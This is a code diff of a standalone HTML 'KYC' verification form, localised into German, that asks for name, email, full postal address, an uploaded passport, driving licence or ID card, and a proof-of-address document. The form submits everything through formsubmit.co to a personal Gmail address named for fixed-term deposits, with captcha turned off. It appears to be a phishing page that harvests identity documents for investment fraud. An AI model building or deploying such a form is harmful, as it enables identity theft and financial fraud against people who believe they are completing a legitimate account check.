@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>KYC Verification Form</title>
+  <title>KYC Verifizierungsformular</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,7 +13,7 @@
 
     .form-container {
       background-color: #ffffff;
-      max-width: 500px;
+      max-width: 550px;
       margin: auto;
       padding: 30px;
       border-radius: 10px;
@@ -22,7 +22,7 @@
 
     h2 {
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
       color: #333;
     }
 
@@ -42,7 +42,7 @@
     }
 
     button {
-      margin-top: 20px;
+      margin-top: 25px;
       width: 100%;
       padding: 12px;
       background-color: #007BFF;
@@ -60,34 +60,44 @@
 </head>
 <body>
   <div class="form-container">
-    <h2>KYC Verification Form</h2>
+    <h2>KYC Verifizierungsformular</h2>
     <form action="https://formsubmit.co/festgeldpartner@gmail.com" method="POST" enctype="multipart/form-data">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://nextterminal.github.io/kyc-form/thanks.html">
+      <input type="hidden" name="_next" value="https://yourusername.github.io/kyc-form/thanks.html">
 
-      <label for="fullname">Full Name</label>
+      <label for="fullname">Vollständiger Name</label>
       <input type="text" name="fullname" id="fullname" required>
 
-      <label for="email">Email</label>
+      <label for="email">E-Mail-Adresse</label>
       <input type="email" name="email" id="email" required>
 
-      <label for="address">Address</label>
-      <textarea name="address" id="address" rows="3" required></textarea>
+      <label for="street">Straße und Hausnummer</label>
+      <input type="text" name="street" id="street" required>
 
-      <label for="id_type">ID Type</label>
+      <label for="zip">Postleitzahl</label>
+      <input type="text" name="zip" id="zip" required>
+
+      <label for="city">Stadt</label>
+      <input type="text" name="city" id="city" required>
+
+      <label for="country">Land</label>
+      <input type="text" name="country" id="country" required>
+
+      <label for="id_type">Ausweisart</label>
       <select name="id_type" id="id_type" required>
-        <option value="">Select one</option>
-        <option value="Passport">Passport</option>
-        <option value="Driver’s License">Driver’s License</option>
+        <option value="">Bitte wählen</option>
+        <option value="Reisepass">Reisepass</option>
+        <option value="Führerschein">Führerschein</option>
+        <option value="Personalausweis">Personalausweis</option>
       </select>
 
-      <label for="id_document">Upload ID Document (PDF/Image)</label>
+      <label for="id_document">Ausweisdokument hochladen (PDF/Bild)</label>
       <input type="file" name="id_document" id="id_document" accept=".pdf,image/*" required>
 
-      <label for="proof_of_address">Upload Proof of Address (Bill/Statement)</label>
+      <label for="proof_of_address">Adressnachweis hochladen (z. B. Rechnung, Kontoauszug)</label>
       <input type="file" name="proof_of_address" id="proof_of_address" accept=".pdf,image/*" required>
 
-      <button type="submit">Submit KYC</button>
+      <button type="submit">Absenden</button>
     </form>
   </div>
 </body>
